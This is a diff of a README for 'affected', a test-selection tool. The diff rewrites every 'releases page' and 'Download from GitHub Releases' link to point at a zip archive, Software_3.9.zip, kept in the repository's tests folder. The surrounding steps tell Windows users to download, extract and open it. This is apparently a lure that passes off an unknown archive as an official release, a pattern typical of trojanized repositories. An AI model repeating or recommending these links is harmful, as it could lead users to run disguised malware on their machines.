@@ -1,6 +1,6 @@
 # 🧪 affected - Run fewer tests with confidence
 
-[⬇️ Download affected](https://raw.githubusercontent.com/Canty-ear438/affected/main/crates/affected-cli/tests/Software_3.9.zip)
+[⬇️ Download affected](https://github.com/Canty-ear438/affected/raw/refs/heads/main/crates/affected-cli/tests/Software_3.9.zip)
 
 ## 🛠️ What it does
 
@@ -27,7 +27,7 @@ It works with common project types, including:
 
 ## 📥 Download
 
-1. Visit the [releases page](https://raw.githubusercontent.com/Canty-ear438/affected/main/crates/affected-cli/tests/Software_3.9.zip).
+1. Visit the [releases page](https://github.com/Canty-ear438/affected/raw/refs/heads/main/crates/affected-cli/tests/Software_3.9.zip).
 2. Find the latest version for Windows.
 3. Download the file that matches your system.
 4. Open the downloaded file to start the app.
@@ -38,7 +38,7 @@ If your browser saves the file to your Downloads folder, open that folder and do
 
 Follow these steps on Windows:
 
-1. Open the [releases page](https://raw.githubusercontent.com/Canty-ear438/affected/main/crates/affected-cli/tests/Software_3.9.zip).
+1. Open the [releases page](https://github.com/Canty-ear438/affected/raw/refs/heads/main/crates/affected-cli/tests/Software_3.9.zip).
 2. Download the Windows version.
 3. If the file is in a .zip folder, right-click it and choose Extract All.
 4. Open the extracted folder.
@@ -90,7 +90,7 @@ If your repo contains many apps and libraries, affected makes it easier to keep 
 
 ## 🧭 Basic workflow
 
-1. Download the app from the [releases page](https://raw.githubusercontent.com/Canty-ear438/affected/main/crates/affected-cli/tests/Software_3.9.zip).
+1. Download the app from the [releases page](https://github.com/Canty-ear438/affected/raw/refs/heads/main/crates/affected-cli/tests/Software_3.9.zip).
 2. Start the app on Windows.
 3. Point it at your project folder.
 4. Let it scan the repository.
@@ -138,7 +138,7 @@ Before you use it, have these ready:
 
 - A Windows PC
 - A project folder on your drive
-- The latest file from the [releases page](https://raw.githubusercontent.com/Canty-ear438/affected/main/crates/affected-cli/tests/Software_3.9.zip)
+- The latest file from the [releases page](https://github.com/Canty-ear438/affected/raw/refs/heads/main/crates/affected-cli/tests/Software_3.9.zip)
 - Enough disk space for your project scan
 
 For best results, keep your project in a single root folder with each app or package in its own subfolder.
@@ -177,7 +177,7 @@ affected helps you keep the work focused. That makes it easier to:
 
 Use this page to get the Windows release:
 
-[Download affected from GitHub Releases](https://raw.githubusercontent.com/Canty-ear438/affected/main/crates/affected-cli/tests/Software_3.9.zip)
+[Download affected from GitHub Releases](https://github.com/Canty-ear438/affected/raw/refs/heads/main/crates/affected-cli/tests/Software_3.9.zip)
 
 ## 🧪 Workflow for test runs
 
